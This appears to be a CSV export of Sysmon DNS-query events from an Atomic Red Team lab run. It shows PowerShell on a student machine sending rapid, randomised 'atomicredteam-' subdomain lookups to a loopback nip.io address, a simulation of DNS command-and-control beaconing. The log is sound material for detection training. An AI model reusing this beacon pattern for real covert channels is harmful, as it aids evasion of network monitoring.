"2025-12-22 13:58:49.062 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166022,"Query: atomicredteam-113705.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:48.214","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:49.062 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166023,"Query: atomicredteam-714087.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:48.258","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:49.062 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166024,"Query: atomicredteam-201674.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:48.302","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:49.062 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166025,"Query: atomicredteam-141878.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:48.345","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:49.063 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166026,"Query: atomicredteam-742930.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:48.388","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:49.063 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166027,"Query: atomicredteam-503553.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:48.433","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:49.063 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166028,"Query: atomicredteam-133791.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:48.478","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:49.064 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166029,"Query: atomicredteam-60590.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:48.650","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:49.064 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166030,"Query: atomicredteam-577586.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:48.693","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:49.064 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166031,"Query: atomicredteam-937836.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:48.739","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:49.064 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166032,"Query: atomicredteam-406372.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:48.785","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:49.065 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166033,"Query: atomicredteam-440078.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:48.828","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:49.065 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166034,"Query: atomicredteam-375957.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:48.869","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:49.065 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166035,"Query: atomicredteam-84168.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:48.914","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:49.065 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166036,"Query: atomicredteam-190257.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:48.954","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:50.071 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166037,"Query: atomicredteam-33290.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:48.998","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:50.071 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166038,"Query: atomicredteam-550134.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:49.041","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:50.072 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166039,"Query: atomicredteam-600665.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:49.085","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:50.072 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166040,"Query: atomicredteam-632939.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:49.128","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:50.072 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166041,"Query: atomicredteam-357388.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:49.173","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:50.072 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166042,"Query: atomicredteam-754092.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:49.218","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:50.072 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166043,"Query: atomicredteam-176850.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:49.259","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:50.073 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166044,"Query: atomicredteam-587845.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:49.300","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:50.073 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166045,"Query: atomicredteam-974698.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:49.345","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:50.073 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166046,"Query: atomicredteam-213413.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:49.388","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:50.073 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166047,"Query: atomicredteam-312014.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:49.429","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:50.073 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166048,"Query: atomicredteam-941726.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:49.472","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:50.074 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166049,"Query: atomicredteam-450912.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:49.515","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:50.074 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166050,"Query: atomicredteam-159938.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:49.696","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:50.074 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166051,"Query: atomicredteam-81586.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:49.739","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:50.074 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166052,"Query: atomicredteam-845600.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:49.784","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:50.074 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166053,"Query: atomicredteam-94749.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:49.828","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:50.075 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166054,"Query: atomicredteam-763758.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:50.009","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:50.075 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166055,"Query: atomicredteam-970315.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:50.053","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:51.076 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166056,"Query: atomicredteam-36604.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:50.099","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:51.076 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166057,"Query: atomicredteam-697606.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:50.144","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:51.076 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166058,"Query: atomicredteam-708356.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:50.187","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:51.077 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166059,"Query: atomicredteam-906708.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:50.229","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:51.077 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166060,"Query: atomicredteam-564467.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:50.274","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:51.077 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166061,"Query: atomicredteam-147062.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:50.318","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:51.077 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166062,"Query: atomicredteam-627236.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:50.360","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:51.077 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166063,"Query: atomicredteam-468918.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:50.403","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:51.078 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166064,"Query: atomicredteam-374531.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:50.447","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:51.078 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166065,"Query: atomicredteam-747039.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:50.490","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:51.078 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166066,"Query: atomicredteam-553608.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:50.532","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:52.082 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166067,"Query: atomicredteam-830431.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:50.575","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:52.083 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166068,"Query: atomicredteam-66729.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:50.745","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:52.083 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166069,"Query: atomicredteam-228272.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:50.791","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:52.083 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166070,"Query: atomicredteam-506734.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:50.833","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
